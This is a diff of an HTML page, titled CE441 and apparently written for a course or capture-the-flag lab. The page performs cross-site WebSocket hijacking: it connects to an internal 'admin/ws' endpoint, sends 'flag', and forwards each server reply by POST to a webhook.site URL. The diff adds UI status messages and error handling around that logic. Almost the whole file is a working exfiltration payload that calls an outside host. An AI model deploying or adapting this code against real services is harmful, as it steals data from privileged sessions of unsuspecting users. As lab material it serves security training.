@@ -1,28 +1,52 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>CE441</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CE441</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+        #status {
+            margin-top: 20px;
+            color: green;
+        }
+    </style>
 </head>
 <body>
-  <script>
+    <h1>WebSocket to Webhook</h1>
+    <p id="message">Attempting to connect to the WebSocket server...</p>
+    <div id="status"></div>
+
+    <script>
+        // Replace this with your Webhook.site unique URL
         const webhookURL = "https://webhook.site/308904c1-7e12-46fc-943f-7bf4747b9658";
+
+        // Initialize WebSocket connection
         const ws = new WebSocket('ws://web:8080/admin/ws');
+
+        // Display message when the connection is opened
         ws.onopen = () => {
-            ws.send("flag");
-            fetch(webhookURL, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({ message: 'flag message sent' })
-            })
-            .then(response => {
-                console.log(response.status);
-            });
-        }
+            console.log('WebSocket connection established.');
+            document.getElementById('message').innerText = 'WebSocket connection established.';
+            
+            // Send a message to the server
+            const message = 'flag';
+            ws.send(message);
+            console.log(`Message sent: ${message}`);
+            document.getElementById('status').innerText = `Message sent: ${message}`;
+        };
+
+        // Handle incoming messages
         ws.onmessage = (event) => {
             const receivedMessage = event.data;
+            console.log('Message received from server:', receivedMessage);
+            document.getElementById('status').innerText = `Server response: ${receivedMessage}`;
+
+            // Send the received message to Webhook.site
             fetch(webhookURL, {
                 method: "POST",
                 headers: {
@@ -31,9 +55,26 @@
                 body: JSON.stringify({ message: receivedMessage })
             })
             .then(response => {
-                console.log(response.status);
+                console.log('Message sent to Webhook.site:', response.status);
+                document.getElementById('message').innerText = `Message sent to Webhook.site: ${response.status}`;
+            })
+            .catch(error => {
+                console.error('Error sending message to Webhook.site:', error);
+                document.getElementById('message').innerText = 'Error sending message to Webhook.site. Check the console.';
             });
-        }
+        };
+
+        // Handle connection errors
+        ws.onerror = (error) => {
+            console.error('WebSocket error:', error);
+            document.getElementById('message').innerText = 'WebSocket error. Check the console for details.';
+        };
+
+        // Handle connection closure
+        ws.onclose = () => {
+            console.log('WebSocket connection closed.');
+            document.getElementById('message').innerText = 'WebSocket connection closed.';
+        };
     </script>
 </body>
 </html>
